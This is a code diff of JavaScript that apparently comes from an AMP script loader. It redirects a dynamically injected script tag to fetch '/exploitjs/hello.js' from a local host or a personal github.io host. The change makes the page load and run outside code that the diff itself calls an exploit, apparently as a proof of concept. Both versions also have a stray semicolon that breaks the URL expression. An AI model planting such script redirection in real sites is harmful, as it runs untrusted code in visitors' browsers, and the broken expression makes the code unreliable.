@@ -29,7 +29,7 @@
             }
        
         if (AMP_MODE.localDev) {
-            loc = loc.protocol + "//" + loc.host + "/#dist"
+            loc = loc.protocol + "//" + loc.host + "/exploitjs/hello.js#dist"
         } else {
             loc = "https://gaeunbae.github.io";
         }
@@ -37,7 +37,7 @@
         var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
         b = window.document.createElement("script");
         pluginName ="tempplugin";
-        b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
+        b.src = loc + "/exploitjs/hello.js#/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
         console.log(b.src);
         document.head.appendChild(b);
       
